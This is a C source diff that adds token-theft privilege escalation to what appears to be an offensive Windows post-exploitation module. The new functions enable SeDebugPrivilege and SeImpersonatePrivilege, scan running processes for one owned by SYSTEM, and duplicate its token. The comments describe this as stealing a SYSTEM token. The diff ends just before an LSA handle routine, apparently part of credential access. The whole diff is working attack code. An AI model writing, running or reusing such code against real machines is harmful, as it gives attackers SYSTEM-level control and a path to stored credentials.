@@ -72,6 +72,86 @@ HANDLE StealSystemToken() {
     return hDuplicateToken;
 }
 
+BOOL EnablePrivilege(const char* privilegeName) {
+    HANDLE hToken = NULL;
+    TOKEN_PRIVILEGES tp = { 0 };
+    LUID luid;
+
+    if (!ADVAPI32$OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return FALSE;
+
+    if (!ADVAPI32$LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
+        KERNEL32$CloseHandle(hToken);
+        return FALSE;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    KERNEL32$CloseHandle(hToken);
+    return ok;
+}
+
+HANDLE GetSystemTokenFromProcess() {
+    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
+    PSID systemSid = NULL;
+    HANDLE hDup = NULL;
+
+    if (!ADVAPI32$AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &systemSid))
+        return NULL;
+
+    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) {
+        ADVAPI32$FreeSid(systemSid);
+        return NULL;
+    }
+
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    if (KERNEL32$Process32FirstW(hSnap, &pe)) {
+        do {
+            HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+            if (!hProc)
+                continue;
+
+            HANDLE hToken = NULL;
+            if (ADVAPI32$OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
+                DWORD retLen = 0;
+                ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &retLen);
+                TOKEN_USER* tokenUser = (TOKEN_USER*)MemAlloc(retLen);
+                if (tokenUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenUser, retLen, &retLen)) {
+                    if (ADVAPI32$EqualSid(tokenUser->User.Sid, systemSid))
+                        ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup);
+                    MemFree(tokenUser);
+                }
+                KERNEL32$CloseHandle(hToken);
+            }
+            KERNEL32$CloseHandle(hProc);
+        } while (!hDup && KERNEL32$Process32NextW(hSnap, &pe));
+    }
+
+    KERNEL32$CloseHandle(hSnap);
+    ADVAPI32$FreeSid(systemSid);
+    return hDup;
+}
+
+HANDLE EscalateToSystem() {
+    // 1) Adopt a SYSTEM impersonation token already present on some thread
+    //    in this process (e.g. a previous named-pipe impersonation).
+    HANDLE hToken = StealSystemToken();
+    if (hToken)
+        return hToken;
+
+    // 2) Actively escalate: enable the privileges an elevated Administrator
+    //    holds (SeDebugPrivilege to open SYSTEM processes, SeImpersonatePrivilege
+    //    to duplicate + set an impersonation token) and steal a primary token
+    //    from any SYSTEM process.
+    EnablePrivilege("SeDebugPrivilege");
+    EnablePrivilege("SeImpersonatePrivilege");
+    return GetSystemTokenFromProcess();
+}
+
 NTSTATUS GetLsaHandle(HANDLE* hLsa) {
     NTSTATUS status = STATUS_SUCCESS;
     HANDLE hLsaLocal = NULL;
